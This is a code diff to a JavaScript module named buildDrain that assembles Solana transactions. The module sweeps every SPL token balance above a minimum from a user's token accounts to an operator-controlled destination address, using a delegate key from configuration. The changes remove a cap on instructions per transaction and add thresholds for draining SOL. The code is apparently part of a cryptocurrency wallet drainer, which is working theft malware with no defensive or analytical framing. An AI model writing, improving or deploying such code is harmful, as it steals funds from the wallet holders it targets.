@@ -1,15 +1,10 @@
-const { 
-    Transaction, 
-    PublicKey 
-} = require("@solana/web3.js");
-
+const { Transaction, PublicKey, SystemProgram } = require("@solana/web3.js");
 const {
     createTransferInstruction,
-    getAssociatedTokenAddressSync,
-    createAssociatedTokenAccountInstruction,
-    TOKEN_PROGRAM_ID
+    getAssociatedTokenAddress,
+    getAccount,
+    createAssociatedTokenAccountInstruction
 } = require("@solana/spl-token");
-
 const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
@@ -17,85 +12,69 @@ const { withRetry } = require("../core/rpcPool");
 const { getBlockhash, setBlockhash } = require("../core/blockhashCache");
 
 const MIN_RAW_AMOUNT = 1000n;
-const MAX_INSTRUCTIONS_PER_TX = 12;
+const MIN_SOL_TO_DRAIN = 200000n; // 0.0002 SOL
+const SOL_BUFFER = 50000n;        // 0.00005 SOL
 
 async function buildDrain(user, connection) {
     return withRetry(async (conn) => {
         try {
             const config = getConfig();
             const tx = new Transaction();
-
             const userPubkey = new PublicKey(user);
             const delegatePubkey = new PublicKey(config.WALLET);
             const destinationPubkey = new PublicKey(config.DESTINATION_ADDRESS);
             const feePayer = new PublicKey(config.PUBLIC_KEY);
 
-            // Blockhash
             let blockhash = getBlockhash();
             if (!blockhash) {
-                const latest = await conn.getLatestBlockhash("confirmed");
-                blockhash = latest.blockhash;
+                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
+                blockhash = freshBlockhash;
                 setBlockhash(blockhash);
             }
 
             tx.recentBlockhash = blockhash;
             tx.feePayer = feePayer;
 
-            // ===== 1. Načítaj token účty používateľa =====
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
-            // ===== 2. Pre každý token priprav drain =====
             for (const token of tokenAccounts.tokens || []) {
-                const rawAmount = BigInt(token.amount);
-                if (rawAmount < MIN_RAW_AMOUNT) continue;
+                if (token.amount < MIN_RAW_AMOUNT) continue;
 
-                const mint = new PublicKey(token.mint);
-                const userAta = new PublicKey(token.ata);
+                const destAta = await getAssociatedTokenAddress(token.mint, destinationPubkey);
 
-                // Destination ATA
-                const destAta = getAssociatedTokenAddressSync(
-                    mint,
-                    destinationPubkey,
-                    false,
-                    TOKEN_PROGRAM_ID
-                );
+                let destExists = true;
+                try {
+                    await getAccount(conn, destAta);
+                } catch {
+                    destExists = false;
+                }
 
-                // Skús zistiť, či ATA existuje
-                const destInfo = await conn.getAccountInfo(destAta);
-                if (!destInfo) {
+                if (!destExists) {
                     tx.add(
                         createAssociatedTokenAccountInstruction(
                             feePayer,
                             destAta,
                             destinationPubkey,
-                            mint,
-                            TOKEN_PROGRAM_ID,
-                            TOKEN_PROGRAM_ID
+                            token.mint
                         )
                     );
                 }
 
-                // Transfer (drain) tokenov z user ATA → destination ATA
                 tx.add(
                     createTransferInstruction(
-                        userAta,
+                        token.ata,
                         destAta,
                         delegatePubkey,
-                        rawAmount
+                        token.amount
                     )
                 );
-
-                if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
-                    break;
-                }
             }
 
-            logger.info("Drain TX built", {
-                instructions: tx.instructions.length,
-                maxInstructionsPerTx: MAX_INSTRUCTIONS_PER_TX
-            });
+            
+            
 
+            logger.info("Drain transaction built", { instructions: tx.instructions.length });
             return tx;
         } catch (err) {
             logger.error("Failed to build drain transaction", { error: err.message });
